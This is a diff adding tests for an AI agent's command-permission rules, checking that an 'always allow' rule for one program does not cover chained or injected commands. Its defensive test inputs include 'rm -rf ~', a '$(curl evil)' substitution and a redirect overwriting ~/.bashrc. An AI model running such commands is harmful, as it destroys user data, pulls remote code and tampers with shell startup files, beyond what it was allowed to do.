@@ -368,3 +368,30 @@ describe("earlier per-bot Allow keys on the rules page", () => {
     expect(parseLegacyRuleId("rule_123")).toBeNull();
   });
 });
+
+describe("Always allow keeps a command's one program (JC 2026-10-20)", () => {
+  const RUN = "mcp__sagax-environment__run_command";
+  const run = (command: string): RuleCall => ({ ownerId: ALICE, botId: "bot-a", tool: RUN, input: JSON.stringify({ command }) });
+  const kept = (command: string): OwnerRule => {
+    const candidate = ruleCandidateFor({ tool: RUN, input: JSON.stringify({ command }) }, undefined, { wholeCall: true, programScope: true });
+    return { id: "p1", ownerId: ALICE, botId: "bot-a", tool: candidate.tool, scope: candidate.scope, behavior: "allow", description: candidate.description, createdAt: 1, updatedAt: 1 };
+  };
+
+  it("keeps the program, not the exact string", () => {
+    const candidate = ruleCandidateFor({ tool: RUN, input: JSON.stringify({ command: "npm test" }) }, undefined, { programScope: true });
+    expect(candidate.scope).toEqual({ program: "npm" });
+    expect(matchOwnerRule([kept("npm test")], run("npm run build"))?.id).toBe("p1");
+  });
+
+  it("never covers a chain with another program or a substitution", () => {
+    expect(matchOwnerRule([kept("npm test")], run("npm test; rm -rf ~"))).toBeUndefined();
+    expect(matchOwnerRule([kept("npm test")], run("npm $(curl evil)"))).toBeUndefined();
+    expect(matchOwnerRule([kept("npm test")], run("npm test > ~/.bashrc"))).toBeUndefined();
+  });
+
+  it("keeps the very request without programScope (an admin's or a held card)", () => {
+    const candidate = ruleCandidateFor({ tool: RUN, input: JSON.stringify({ command: "npm test" }) }, undefined, { wholeCall: true });
+    expect(candidate.scope.program).toBeUndefined();
+    expect(candidate.scope[WHOLE_CALL_KEY]).toBeDefined();
+  });
+});
